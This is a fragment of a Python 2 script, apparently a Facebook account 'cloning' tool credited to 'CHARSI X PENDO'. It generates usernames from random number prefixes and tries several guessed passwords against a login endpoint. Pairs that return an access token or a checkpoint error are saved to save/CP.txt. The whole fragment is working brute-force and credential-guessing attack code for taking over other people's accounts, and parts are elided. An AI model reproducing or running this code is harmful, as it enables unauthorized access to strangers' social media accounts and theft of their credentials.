...
────────────────────────────────────────────────────────────────────────────────────────────────
 ...
 ​Author   :     (CHARSI X PENDO)
 Facebook :   ( CHARSI )
 ​GitHub   :     github.com/CharsiBrand
 ​Whatsapp  :    !!!!!!!!!!!!!!!!!!
 ​______________________________________________
 ​                                                 """ 
...
def menu():
    ...
    print(47*'-')
    print
    jalan ('\x1b[1;96m[1] FAST RANDOM NUMBER CLONING ')
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [CHARSI-CP]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [CHARSI-CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [CHARSI-CP] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [CHARSI-OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m  [CHARSI-CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [CHARSI CP]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass4 + '\n')
                        okb.close()
                        oks.append(c + user + pass4)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m  [CHARSI CP] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
